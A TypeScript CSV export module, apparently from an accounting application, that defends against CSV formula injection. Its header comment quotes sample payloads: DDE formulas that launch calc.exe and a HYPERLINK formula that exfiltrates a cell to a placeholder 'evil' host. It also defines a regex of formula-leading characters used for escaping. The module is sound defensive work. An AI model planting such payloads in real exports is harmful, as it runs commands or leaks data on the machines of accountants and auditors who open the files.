// Minimal CSV writer. RFC 4180-ish: quote cells containing comma, double-
// quote, or newline; escape embedded double-quotes by doubling them. No
// streaming — everything is buffered in memory. Fine at portfolio scale
// (a 10k-row TB CSV is ~500 KB).
//
// SECURITY (CWE-1236, CSV formula injection):
//
// A cell whose first character is `=`, `+`, `-`, `@`, tab, or carriage-
// return is interpreted by Excel / Google Sheets / LibreOffice as a
// FORMULA when the CSV is opened. An attacker who can write to a field
// that later flows into a CSV — entity name, party name, account name,
// JE memo, recurring template memo, audit metadata, etc. — can stage
// payloads like:
//   `=cmd|'/c calc'!A1`   → runs calc.exe on Windows DDE-enabled Excel
//   `=HYPERLINK("http://evil/?x="&A1,"click me")` → exfiltrates the
//                                                    adjacent cell
//   `@SUM(1+1)*cmd|'/c calc'!A1` → variant with @ prefix
//
// CPAs DOWNLOAD these CSVs and OPEN THEM IN EXCEL. The auditor does
// the same. This is real and exploitable.
//
// Standard OWASP / CERT recommendation: prefix any cell whose first
// character is one of the danger leaders with a single quote ('). The
// single quote is preserved in the CSV; Excel reads it as a literal
// leading-apostrophe text cell and refuses to evaluate as a formula.
// We do this in `escapeFormula()` below, called by `cell()` BEFORE
// the quote-for-special-chars step so the apostrophe lands inside the
// quoted cell when one is needed.

export type CsvCell = string | number | null | undefined;

export function toCsv(rows: CsvCell[][]): string {
  return rows.map((row) => row.map(cell).join(",")).join("\n");
}

/** Leading characters that trigger formula evaluation in spreadsheet apps. */
const FORMULA_LEADERS = /^[=+\-@\t\r]/;

function escapeFormula(s: string): string {
  return FORMULA_LEADERS.test(s) ? `'${s}` : s;
}

function cell(value: CsvCell): string {
  if (value === null || value === undefined) return "";
  // Numbers are safe — they can't start with a formula leader after
  // String() coercion (negative numbers stringify as `-123` but they're
  // genuine numeric values, not user-controlled strings; we trust the
  // caller to only pass actual numbers as numbers). For string cells,
  // run the formula-leader escape first.
  let s = String(value);
  if (typeof value === "string") {
    s = escapeFormula(s);
  }
  if (/[",\n]/.test(s)) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}

// Standard CSV headers we want every export to include for traceability.
export function csvFilename(reportName: string, suffix?: string): string {
  const datePart = suffix ?? new Date().toISOString().slice(0, 10);
  return `${reportName}-${datePart}.csv`;
}
